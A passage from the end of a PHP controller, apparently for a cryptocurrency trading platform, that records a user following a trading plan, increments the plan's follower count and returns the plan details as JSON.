	        $this->ajaxReturn(['code'=>0,'msg'=>L('USDT余额不足')]);
	    }

	    $log['plan_id'] = $plan['id'];
	    $log['uid'] = $uid;
	    $log['username'] = $user['username'];
	    $log['coinname'] = $plan['coinname'];
	    $log['direction'] = $plan['direction'];
	    $log['period'] = $plan['period'];
	    $log['created_at'] = $now;
	    $res = M("hy_follow_log")->add($log);
	    if($res){
	        M("hy_follow_plan")->where(array('id'=>$plan['id']))->setInc('follow_count',1);
	        $this->ajaxReturn(['code'=>1,'data'=>array(
	            'id'=>$plan['id'],
	            'coinname'=>$plan['coinname'],
	            'period'=>$plan['period'],
	            'amount'=>$calcAmount,
	            'percent'=>$planPercent,
	            'direction'=>$plan['direction'],
	            'title'=>$plan['title'],
	            'start_time'=>$plan['start_time'],
	            'end_time'=>$plan['end_time'],
	            'kongyk'=>$plan['kongyk'],
	        )]);
	    }else{
	        $this->ajaxReturn(['code'=>0,'msg'=>L('跟随失败')]);
	    }
	}
	

}
?>